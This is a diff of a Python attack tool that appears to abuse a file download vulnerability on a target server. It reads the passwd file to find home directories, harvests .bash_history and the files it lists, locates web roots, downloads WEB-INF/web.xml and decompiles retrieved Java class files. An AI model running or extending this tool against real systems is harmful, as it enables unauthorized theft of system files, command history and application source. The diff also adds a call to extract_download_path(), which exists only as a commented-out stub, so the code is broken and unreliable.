@@ -29,6 +29,9 @@ download_Fail_byte = b""
 IMPORT_PATTERN = re.compile(r"^import com")
 PACKAGE_PATTERN = re.compile(r"^package com")
 
+
+# --passwd 로직
+
 def extract_account(passwd: Path) -> None:
     global homeDir
     with open(passwd, "r") as f:
@@ -134,8 +137,17 @@ def find_WebRoot(line: str):
                 WebRoot.append(web_root)
                 print("find WEBROOT : " + web_root)
 
+def download_web_xml():
+    if WebRoot:
+        for path in WebRoot:
+            path = path + "/WEB-INF/web.xml"
+            result = download_File(path)
+            if result and (not download_Fail_byte or download_Fail_byte not in result):
+                mkFile(result, path)
 
-def extract_web_xml():
+# def extract_download_path():
+#     for file in downloaded_file:
+
 
 
 def solve_Bash_History():
@@ -186,7 +198,10 @@ def solve_Bash_History():
                     result = download_File(file_path)
                     if result and (not download_Fail_byte or download_Fail_byte not in result):
                         mkFile(result, file_path)
-    
+
+
+# --class_file 로직
+
 def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
     if not cfr_path.is_file():
         raise FileNotFoundError(f"CFR file not Found!!!")
@@ -328,7 +343,9 @@ def main():
         download_SystemFile()
         if homeDir != "":
             solve_Bash_History()
-            extract_web_xml()
+            download_web_xml()
+            extract_download_path()
+            
         else:
             print("Not Found .bash_history...")
             # 추가 예정
